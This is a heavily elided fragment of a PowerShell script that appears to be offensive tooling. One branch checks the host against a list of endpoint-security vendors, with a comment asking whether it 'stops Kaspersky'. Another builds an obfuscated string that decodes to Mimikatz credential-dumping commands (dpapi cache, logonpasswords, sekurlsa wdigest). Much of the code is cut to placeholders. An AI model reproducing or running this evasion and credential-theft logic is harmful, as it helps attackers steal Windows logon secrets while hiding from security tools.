...
If($ManyCats.IsPresent)
{
   ...
   ForEach($Item in $EDRvendors)
   {
      ...
      If($Testme -iMatch "$Item")
      {
         ...
         {
            ## TODO: ASK SHANTY IF THIS STOPS KASPERSKY
   ...
   Else
   {
      ...
      Else
      {
         If($Module -iMatch '^(auto)$')
         {
            ...
            $Sting = "ne%t:@:gro@up dp@ap%i:%:ca@ch%e t%s:@:log%onpa@ssw%o@rds sek%url@sa:@:wd@ig%est exit"
